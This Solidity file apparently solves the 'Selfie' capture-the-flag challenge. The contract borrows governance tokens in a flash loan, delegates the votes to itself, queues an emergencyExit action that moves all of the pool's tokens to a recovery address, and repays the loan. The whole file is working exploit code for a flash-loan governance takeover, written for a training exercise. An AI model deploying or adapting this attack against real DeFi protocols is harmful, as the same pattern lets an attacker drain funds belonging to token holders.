// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC20Votes} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Votes.sol";

interface Governance {
    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId);
}

contract SelfieRecovery {
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    address public allowedInitiator;
    address public pool;
    Governance public governance;
    address public recovery;

    // Errors
    error NotAllowedInitiator();
    error NotPool();

    constructor(
        address _pool,
        address _governance,
        address _recovery
    ) {
        allowedInitiator = msg.sender;
        pool = _pool;
        governance = Governance(_governance);
        recovery = _recovery;
    }

    function onFlashLoan(
        address _initiator,
        address _token,
        uint256 _amount,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        if (_initiator != allowedInitiator) {
            revert NotAllowedInitiator();
        }
        if (msg.sender != pool) {
            revert NotPool();
        }

        // When receiving the loan, we have more than half of the supply, so
        // we can queue actions in the governance contract

        // First, we delegate tokens to this contract, so it can queue actions
        ERC20Votes votingToken = ERC20Votes(_token);
        votingToken.delegate(address(this));

        // We can queue an action to "emergencyExit" all tokens to the recovery account
        governance.queueAction(
            pool,
            0,
            abi.encodeWithSignature("emergencyExit(address)", recovery)
        );

        // We approve the tokens to be received by the pool again
        ERC20 token = ERC20(_token);
        token.approve(pool, _amount);

        return CALLBACK_SUCCESS;
    }
}